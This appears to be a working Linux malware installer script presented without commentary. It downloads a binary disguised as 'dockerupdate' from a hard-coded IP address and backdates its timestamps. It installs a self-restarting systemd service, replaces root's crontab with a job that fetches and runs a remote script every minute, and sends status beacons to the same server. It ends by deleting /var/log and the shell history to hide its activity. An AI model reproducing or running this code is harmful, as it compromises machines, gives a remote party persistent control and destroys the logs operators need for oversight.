#!/bin/sh
systemctl daemon-reload
if [ $? -eq 0 ]; then
systemctl is-enabled dockerupdate.service
        if [ $? -eq 0 ]; then
	curl -s -m 5 http://106.12.40.198:22222/test/dockerupdateOK >/dev/null 2>&1
        else
	systemctl enable dockerupdate.service && systemctl start dockerupdate.service
	systemctl is-enabled dockerupdate.service
		if [ $? -eq 0 ]; then
		curl -s -m 5 http://106.12.40.198:22222/test/dockerupdateUP >/dev/null 2>&1
		else
		chattr -iau dockerupdate*
		chattr -iau /usr/sbin/dockerupdate*
		chattr -iau /lib/systemd/system/dockerupdate*
		rm -rf dockerupdate*
		rm -rf /usr/sbin/dockerupdate*
		rm -rf /lib/systemd/system/dockerupdate*
		curl -s -m 5 -O http://106.12.40.198:22222/test/dockerupdate && mv dockerupdate /usr/sbin && touch -t201507071513 /usr/sbin/dockerupdate && chmod +x /usr/sbin/dockerupdate
		echo "[Unit]" > dockerupdate.service
		echo "Description=dockerupdate" >> dockerupdate.service
		echo "After=multi-user.target" >> dockerupdate.service
		echo "" >> dockerupdate.service
		echo "[Service]" >> dockerupdate.service
		echo "Type=simple" >> dockerupdate.service
		echo "ExecStart=/usr/sbin/dockerupdate" >> dockerupdate.service
		echo "Restart=always" >> dockerupdate.service
		echo "RestartSec=60" >> dockerupdate.service
		echo "" >> dockerupdate.service
		echo "[Install]" >> dockerupdate.service
		echo "WantedBy=multi-user.target" >> dockerupdate.service
		if test -d /lib/systemd/system; then
		mv dockerupdate.service /lib/systemd/system && touch -t201507071513 /lib/systemd/system/dockerupdate.service && chmod 644 /lib/systemd/system/dockerupdate.service
		else
                mv dockerupdate.service /usr/lib/systemd/system && touch -t201507071513 /usr/lib/systemd/system/dockerupdate.service && chmod 644 /usr/lib/systemd/system/dockerupdate.service
		fi
		systemctl daemon-reload && systemctl enable dockerupdate.service && systemctl start dockerupdate.service
		systemctl is-enabled dockerupdate.service
			if [ $? -eq 0 ]; then
	                curl -s -m 5 http://106.12.40.198:22222/test/dockerupdateON >/dev/null 2>&1
        	        else
			curl -s -m 5 http://106.12.40.198:22222/test/dockerupdateOFF >/dev/null 2>&1
			fi
	        fi
	fi
else
curl -s -m 5 http://106.12.40.198:22222/test/UBUNTU >/dev/null 2>&1
				if test -f /usr/sbin/dockerupdate && test -f /lib/systemd/system/dockerupdate.service; then
				curl -s -m 5 http://106.12.40.198:22222/test/dockerupdateUBNTYES >/dev/null 2>&1
				else
				chattr -R -aui /var/spool/cron/
				chattr -aui /var/spool/cron/crontabs/root
				chattr -aui cron
				chattr -R -aui /etc/cron.d
				crontab -r
				echo '*/1 * * * * curl -m 5 -s -O http://106.12.40.198:22222/test/yyy.sh && chmod +x yyy.sh && sh yyy.sh ; rm -rf yyy.sh ; crontab -r >/dev/null 2>&1' >cron
				crontab -u root cron
				rm -rf cron
				crontab -l | grep -e "zzz.sh" | grep -v grep
					if [ $? -eq 0 ]; then
			                curl -s -m 5 http://106.12.40.198:22222/test/cronOK >/dev/null 2>&1
				        else
			                curl -s -m 5 http://106.12.40.198:22222/test/cronBAD >/dev/null 2>&1
					fi
				fi
fi

chattr -R -aui /var/log/
chattr -aui /var/log/*
rm -rf /var/log
rm -rf /root/.bash_history
history -cw
